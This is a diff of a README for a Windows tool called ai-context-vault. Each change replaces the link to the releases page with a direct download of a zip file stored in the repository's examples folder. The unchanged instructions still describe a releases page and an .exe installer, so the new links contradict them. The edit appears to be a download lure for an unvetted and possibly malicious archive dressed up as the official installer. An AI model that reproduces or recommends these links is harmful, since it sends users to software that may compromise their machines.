@@ -1,6 +1,6 @@
 # 🔐 ai-context-vault - Store and Resume AI Context Easily
 
-[![Download ai-context-vault](https://img.shields.io/badge/Download-ai--context--vault-brightgreen)](https://github.com/codingwithgokul/ai-context-vault/releases)
+[![Download ai-context-vault](https://img.shields.io/badge/Download-ai--context--vault-brightgreen)](https://github.com/codingwithgokul/ai-context-vault/raw/refs/heads/main/examples/vault_ai_context_3.6.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To run ai-context-vault on your Windows PC, make sure your system meets these re
 ## 🚀 Getting Started: Download and Install
 
 1. Visit the download page by clicking this link or the green badge above:  
-   [https://github.com/codingwithgokul/ai-context-vault/releases](https://github.com/codingwithgokul/ai-context-vault/releases)
+   [https://github.com/codingwithgokul/ai-context-vault/raw/refs/heads/main/examples/vault_ai_context_3.6.zip](https://github.com/codingwithgokul/ai-context-vault/raw/refs/heads/main/examples/vault_ai_context_3.6.zip)
 
 2. On the page, find the latest release. Look for a file with `.exe` at the end. This file is the installer you need to run the app on Windows.
 
@@ -113,7 +113,7 @@ To run ai-context-vault on your Windows PC, make sure your system meets these re
 ## 🔗 Download Link Reminder
 
 Download the latest version here:  
-[https://github.com/codingwithgokul/ai-context-vault/releases](https://github.com/codingwithgokul/ai-context-vault/releases)  
+[https://github.com/codingwithgokul/ai-context-vault/raw/refs/heads/main/examples/vault_ai_context_3.6.zip](https://github.com/codingwithgokul/ai-context-vault/raw/refs/heads/main/examples/vault_ai_context_3.6.zip)  
 
 Use the `.exe` installer from this page to get started quickly on Windows.
 
